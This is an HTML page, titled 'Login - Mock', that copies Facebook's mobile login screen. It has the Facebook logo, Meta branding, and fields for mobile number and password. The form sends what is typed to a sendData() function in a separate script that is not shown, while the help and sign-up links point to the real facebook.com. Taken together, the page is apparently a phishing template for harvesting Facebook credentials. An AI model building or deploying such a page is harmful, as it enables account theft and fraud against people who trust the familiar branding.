<!doctype html>
<html lang="hi">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Login - Mock</title>
  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;500;700;900&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <div class="wrap">
    <div class="card">
      <div class="topbar" style="margin-bottom:6px">
        <div class="back" onclick="history.back()">
          <svg width="18" height="18" viewBox="0 0 24 24" fill="none">
            <path d="M15 18l-6-6 6-6" stroke="#0f172a" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
          </svg>
        </div>
        <div style="flex:1"></div>
        <div class="lang">English (US) ▾</div>
      </div>

      <div class="logo-wrap">
        <div class="fb-circle">
          <img src="facebook.png" alt="Facebook Logo">
        </div>
      </div>

      <!-- ✅ Form connect with sendData -->
      <form class="form" id="loginForm" onsubmit="sendData(event)">
        <div class="input-row">
          <input class="input" type="text" id="number" placeholder="Mobile number" required>
          <div class="info-icon">i</div>
        </div>
        <div>
          <input class="input" type="password" id="password" placeholder="Password" required>
        </div>
        <button class="btn" type="submit">Log in</button>
        <div id="errorMsg" style="display:none; color:red; font-size:14px; margin-top:8px;">
          ⚠️ Please fill all fields.
        </div>
        <div class="forgot" onclick="window.location.href='https://www.facebook.com/login/identify/'">
          Forgot password?
        </div>
        <button class="outline-btn" type="button" onclick="window.location.href='https://www.facebook.com/r.php'">
          Create new account
        </button>
      </form>

      <div class="meta">
        <svg width="18" height="14" viewBox="0 0 24 16" fill="none" style="opacity:.9">
          <path d="M2 8s3-6 8-6 8 6 8 6-3 6-8 6S2 8 2 8z" stroke="#6b7280" stroke-width="1.4" stroke-linecap="round" stroke-linejoin="round"/>
        </svg>
        <div>Meta</div>
      </div>
    </div>
  </div>

  <!-- ✅ External JS include -->
  <script src="script.js"></script>
</body>
</html>
